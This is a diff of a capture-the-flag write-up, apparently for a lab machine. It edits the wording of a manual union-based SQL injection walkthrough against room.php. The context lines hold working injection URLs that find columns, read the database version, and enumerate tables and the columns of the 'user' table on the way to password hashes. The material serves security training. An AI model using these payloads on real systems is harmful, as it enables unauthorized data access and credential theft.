@@ -156,7 +156,7 @@ http://10.10.10.143/room.php?cod=5 union select null,null,null,null,null,null,nu
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/955da967-6643-4138-bd4a-4f61947cdc0d)
 
-+ Specify a non-existent cod value or something similar (test in the URL that it loads nothing first). So let's modify the query with **55 not 5** to give the first select statement a cod value that doesn't exist so that it prints out the result from the second statement.
++ Specify a **non-existent cod value** or something similar (test in the URL that it loads nothing first). So let's modify the query with **55 not 5** to give the first select statement a cod value that doesn't exist so that it prints out the result from the second statement.
 + Try `55 union select 1,2,3,4,5,6,7`: `http://10.10.10.143/room.php?cod=55%20union%20select%201,2,3,4,5,6,7`
 + Revealed which columns correspond to the elements in the page.
 
@@ -175,7 +175,7 @@ http://10.10.10.143/room.php?cod=55%20union%20select%201,@@version,@@datadir,use
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eb62cf73-f4b8-409e-8470-1e96c9a11351)
 
-+ Database is MariaDB 10.1.48. Next, tyr to print out the list of password hashes step by step.
++ Database is MariaDB 10.1.48. Next, try to print out the list of password hashes step by step.
 
 + **Enumerate DBs:** **List DBs** using **group_concat()** which puts all the values from different rows into one string, and concats multiple rows of the same table with one query. Otherwise, you get nothing because of querying more than one column in the sub select query. In order to output multiple columns, you can use the group_concat() function.
 ```
@@ -206,7 +206,7 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1eddaf2-30c6-4f41-8b01-91e65b16afe0)
 
 
-+ **Show Columns in user:** But just one table, user table is interesting, and enumerate columns in that table with:
++ **Show Columns in User:** But just one table, user table is interesting, and enumerate columns in that table with:
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='user';-- -
 ```
